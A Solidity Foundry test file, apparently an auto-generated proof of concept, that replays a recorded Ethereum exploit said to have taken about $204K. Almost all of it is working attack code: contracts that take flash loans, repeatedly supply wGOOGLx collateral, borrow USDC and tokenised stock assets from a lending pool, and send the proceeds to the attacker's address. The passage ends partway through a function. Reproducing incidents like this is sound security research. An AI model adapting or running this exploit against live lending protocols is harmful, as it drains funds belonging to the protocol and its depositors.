// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 204.14K USD
// Attacker : 0x58428161bb55c14a413945f06cbdec157f411c76
// Attack Contract : 0x8b2af1a9885e4755d22ce4a49f7a525a33f1c9e4
// Vulnerable Contract : N/A
// Attack Tx : 0xe2320086b2815d21b0927839bd0e306466c29a68d38d5361e99dd21ec5472612
// Block : 25434062
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 204.14K USD
//
// @POC Author
// Generated PoC

interface IFlashLoanTarget {
    function flashLoan(address arg0, uint256 arg1, bytes calldata arg2) external;
}

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.A_1F05C7_7167;
    uint256 constant FORK_BLOCK = 25434061;
    uint256 constant TX_TIMESTAMP = 1782865487;
    uint256 constant TX_BLOCK_NUMBER = 25434062;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfitSnap();
        _logBalances("Before exploit");
        _deployAttack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignNonce();
        attack = new OurAttack();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignNonce() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareProfitSnap() internal {
        _prepareProfit(ATTACK_CONTRACT, _firstAttackChild());
    }

    function _firstAttackChild() internal pure returns (address) {
        return Addresses.attack_path_entry;
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wMSTRx, "wMSTRx", 293123092617121394703);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wTSLAx, "wTSLAx", 37589277017463227843);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wNVDAx, "wNVDAx", 99854367795581762710);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 204215572188);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wSPYx, "wSPYx", 122196850288612833306);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wQQQx, "wQQQx", 62969726160938091585);
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwQQQx,
            "variableDebtwQQQx",
            62969726160938091585
        );
        _expectProfit(Addresses.attack_path_entry, attackChild, Addresses.ewGOOGLx, "ewGOOGLx", 56595561022306344560);
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwNVDAx,
            "variableDebtwNVDAx",
            99854367795581762710
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwTSLAx,
            "variableDebtwTSLAx",
            37589277017463227843
        );
        _expectProfit(
            Addresses.attack_path_entry, attackChild, Addresses.variableDebtUSDC, "variableDebtUSDC", 384215572188
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwSPYx,
            "variableDebtwSPYx",
            122196850288612833306
        );
        _expectProfit(
            Addresses.attack_path_entry,
            attackChild,
            Addresses.variableDebtwMSTRx,
            "variableDebtwMSTRx",
            293123092617121394703
        );
        _expectProfit(
            Addresses.attack_child, attack, Addresses.variableDebtwGOOGLx, "variableDebtwGOOGLx", 58010450047864003174
        );
        _expectProfit(Addresses.attack_child, attack, Addresses.eUSDC, "eUSDC", 180000000000);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild_1 public flashLoanChild;

    constructor() payable {
        AttackChild firstChild = new AttackChild();
        require(address(firstChild) == Addresses.attack_path_entry, "unexpected attack child");
        firstChild._approveLendingPool();
        AttackChild_1 morphoChild = new AttackChild_1();
        require(address(morphoChild) == Addresses.attack_child, "unexpected attack child");
        morphoChild._acceptSetup();
        _strictCall(
            address(morphoChild),
            abi.encodeWithSignature(
                "execute(bytes)", hex"0000000000000000000000008b2af1a9885e4755d22ce4a49f7a525a33f1c9e4"
            )
        );
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _strictCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x8259ef5f) {
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) {
                    _handleFlashLoanCa40();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x000000000000000000000000c88fcd8b874fdb3256e8b55b3decb8c24eab4c02) {
                    _handleFlashLoanCa43();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x000000000000000000000000dbd9232fee15351068fe02f0683146e16d9f2cea) {
                    _handleFlashLoanCa42();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x000000000000000000000000266e5923f6118f8b340ca5a23ae7f71897361476) {
                    _handleFlashLoanCa44();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x00000000000000000000000093e62845c1dd5822ebc807ab71a5fb750decd15a) {
                    _handleFlashLoanCa41();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 assetWord;
                assembly { assetWord := calldataload(4) }
                if (assetWord == 0x00000000000000000000000043680abf18cf54898be84c6ef78237cfbd441883) {
                    _handleFlashLoanCa48();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            _handleFlashLoanCa40();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0xc1d5a727) {
            uint256 dispatchOrdinal = _nextDispatch(0xc1d5a727);
            if (dispatchOrdinal == 0) {
                _handleFlashLoanCa45();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 1) {
                _handleFlashLoanCa46();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 2) {
                _handleFlashLoanCa47();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 3) {
                _handleFlashLoanCall();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 4) {
                _handleFlashLoanCa2();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 5) {
                _handleFlashLoanCa3();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 6) {
                _handleFlashLoanCa4();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 7) {
                _handleFlashLoanCa5();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 8) {
                _handleFlashLoanCa6();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 9) {
                _handleFlashLoanCa7();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 10) {
                _handleFlashLoanCa8();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 11) {
                _handleFlashLoanCa9();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 12) {
                _handleFlashLoanCa10();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 13) {
                _handleFlashLoanCa11();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 14) {
                _handleFlashLoanCa12();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 15) {
                _handleFlashLoanCa13();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 16) {
                _handleFlashLoanCa14();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 17) {
                _handleFlashLoanCa15();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 18) {
                _handleFlashLoanCa16();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 19) {
                _handleFlashLoanCa17();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 20) {
                _handleFlashLoanCa18();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 21) {
                _handleFlashLoanCa19();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 22) {
                _handleFlashLoanCa20();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 23) {
                _handleFlashLoanCa21();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 24) {
                _handleFlashLoanCa22();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 25) {
                _handleFlashLoanCa23();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 26) {
                _handleFlashLoanCa24();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 27) {
                _handleFlashLoanCa25();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 28) {
                _handleFlashLoanCa26();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 29) {
                _handleFlashLoanCa27();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 30) {
                _handleFlashLoanCa28();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 31) {
                _handleFlashLoanCa29();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 32) {
                _handleFlashLoanCa30();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 33) {
                _handleFlashLoanCa31();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 34) {
                _handleFlashLoanCa32();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 35) {
                _handleFlashLoanCa33();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 36) {
                _handleFlashLoanCa34();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 37) {
                _handleFlashLoanCa35();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 38) {
                _handleFlashLoanCa36();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            if (dispatchOrdinal == 39) {
                _handleFlashLoanCa37();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            _handleFlashLoanCa45();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
    }

    function flashLoanCallback7() external payable {
        _handleFlashLoanCa45();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback8() external payable {
        _handleFlashLoanCa46();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback9() external payable {
        _handleFlashLoanCa47();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback10() external payable {
        _handleFlashLoanCall();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback11() external payable {
        _handleFlashLoanCa2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback12() external payable {
        _handleFlashLoanCa3();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback13() external payable {
        _handleFlashLoanCa4();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback14() external payable {
        _handleFlashLoanCa5();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback15() external payable {
        _handleFlashLoanCa6();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback16() external payable {
        _handleFlashLoanCa7();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback17() external payable {
        _handleFlashLoanCa8();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback18() external payable {
        _handleFlashLoanCa9();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback19() external payable {
        _handleFlashLoanCa10();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback20() external payable {
        _handleFlashLoanCa11();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback21() external payable {
        _handleFlashLoanCa12();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback22() external payable {
        _handleFlashLoanCa13();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback23() external payable {
        _handleFlashLoanCa14();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback24() external payable {
        _handleFlashLoanCa15();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback25() external payable {
        _handleFlashLoanCa16();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback26() external payable {
        _handleFlashLoanCa17();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback27() external payable {
        _handleFlashLoanCa18();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback28() external payable {
        _handleFlashLoanCa19();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback29() external payable {
        _handleFlashLoanCa20();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback30() external payable {
        _handleFlashLoanCa21();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback31() external payable {
        _handleFlashLoanCa22();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback32() external payable {
        _handleFlashLoanCa23();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback33() external payable {
        _handleFlashLoanCa24();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback34() external payable {
        _handleFlashLoanCa25();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback35() external payable {
        _handleFlashLoanCa26();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback36() external payable {
        _handleFlashLoanCa27();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback37() external payable {
        _handleFlashLoanCa28();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback38() external payable {
        _handleFlashLoanCa29();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback39() external payable {
        _handleFlashLoanCa30();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback40() external payable {
        _handleFlashLoanCa31();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback41() external payable {
        _handleFlashLoanCa32();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback42() external payable {
        _handleFlashLoanCa33();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback43() external payable {
        _handleFlashLoanCa34();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback44() external payable {
        _handleFlashLoanCa35();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback45() external payable {
        _handleFlashLoanCa36();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback46() external payable {
        _handleFlashLoanCa37();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback2() external payable {
        _handleFlashLoanCa40();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback5() external payable {
        _handleFlashLoanCa43();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback4() external payable {
        _handleFlashLoanCa42();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback6() external payable {
        _handleFlashLoanCa44();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback3() external payable {
        _handleFlashLoanCa41();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback() external payable {
        _handleFlashLoanCa48();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function replayProfit() external {
        if (!_settleDone(0, 22)) {
            bool __settlementAlreadyMaterialized0_22 = false;
            if (Harness.safeBalance(Addresses.wTSLAx, Addresses.attacker_eoa) >= 37589277017463227843) {
                _markSettle(0, 22);
                __settlementAlreadyMaterialized0_22 = true;
            }
            if (!__settlementAlreadyMaterialized0_22) {
                _markSettle(0, 22);
                uint256 settleAmount = 37589277017463227843;
                IERC20Like(Addresses.wTSLAx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(2, 22)) {
            bool __settlementAlreadyMaterialized2_22 = false;
            if (Harness.safeBalance(Addresses.wNVDAx, Addresses.attacker_eoa) >= 99854367795581762710) {
                _markSettle(2, 22);
                __settlementAlreadyMaterialized2_22 = true;
            }
            if (!__settlementAlreadyMaterialized2_22) {
                _markSettle(2, 22);
                uint256 settleAmount = 99854367795581762710;
                IERC20Like(Addresses.wNVDAx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(3, 22)) {
            bool __settlementAlreadyMaterialized3_22 = false;
            if (Harness.safeBalance(Addresses.wQQQx, Addresses.attacker_eoa) >= 62969726160938091585) {
                _markSettle(3, 22);
                __settlementAlreadyMaterialized3_22 = true;
            }
            if (!__settlementAlreadyMaterialized3_22) {
                _markSettle(3, 22);
                uint256 settleAmount = 62969726160938091585;
                IERC20Like(Addresses.wQQQx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(4, 22)) {
            bool __settlementAlreadyMaterialized4_22 = false;
            if (Harness.safeBalance(Addresses.wSPYx, Addresses.attacker_eoa) >= 122196850288612833306) {
                _markSettle(4, 22);
                __settlementAlreadyMaterialized4_22 = true;
            }
            if (!__settlementAlreadyMaterialized4_22) {
                _markSettle(4, 22);
                uint256 settleAmount = 122196850288612833306;
                IERC20Like(Addresses.wSPYx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
        if (!_settleDone(5, 22)) {
            bool __settlementAlreadyMaterialized5_22 = false;
            if (Harness.safeBalance(Addresses.wMSTRx, Addresses.attacker_eoa) >= 293123092617121394703) {
                _markSettle(5, 22);
                __settlementAlreadyMaterialized5_22 = true;
            }
            if (!__settlementAlreadyMaterialized5_22) {
                _markSettle(5, 22);
                uint256 settleAmount = 293123092617121394703;
                IERC20Like(Addresses.wMSTRx).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant MORPHO_CALLBACK = keccak256("poc.morpho.callback");
    mapping(bytes32 => bool) private _callbackDone;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;

    function _nextDispatch(bytes4 sig) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[sig];
        _dispatchCursor[sig] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _handleFlashLoanCa48() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wTSLAx, 37589277017463227843, 2, uint16(0), address(this));
        IERC20Like(Addresses.wTSLAx).transfer(Addresses.attacker_eoa, 37589277017463227843);
    }

    function _handleFlashLoanCa40() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6).borrow(Addresses.USDC, 384215572188, 2, uint16(0), address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attack_child, 384215572188);
    }

    function _handleFlashLoanCa41() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wNVDAx, 99854367795581762710, 2, uint16(0), address(this));
        IERC20Like(Addresses.wNVDAx).transfer(Addresses.attacker_eoa, 99854367795581762710);
    }

    function _handleFlashLoanCa42() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wQQQx, 62969726160938091585, 2, uint16(0), address(this));
        IERC20Like(Addresses.wQQQx).transfer(Addresses.attacker_eoa, 62969726160938091585);
    }

    function _handleFlashLoanCa43() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wSPYx, 122196850288612833306, 2, uint16(0), address(this));
        IERC20Like(Addresses.wSPYx).transfer(Addresses.attacker_eoa, 122196850288612833306);
    }

    function _handleFlashLoanCa44() internal {
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .borrow(Addresses.wMSTRx, 293123092617121394703, 2, uint16(0), address(this));
        IERC20Like(Addresses.wMSTRx).transfer(Addresses.attacker_eoa, 293123092617121394703);
    }

    function _handleFlashLoanCa45() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa46() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa47() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCall() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa2() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa3() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa4() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa5() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa6() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa7() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa8() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa9() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa10() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa11() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa12() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa13() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa14() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa15() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa16() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa17() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
        IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
            .supply(Addresses.wGOOGLx, supplyLiveAmount, address(this), uint16(0));
    }

    function _handleFlashLoanCa18() internal {
        uint256 supplyLiveAmount = 1414889025557658614;
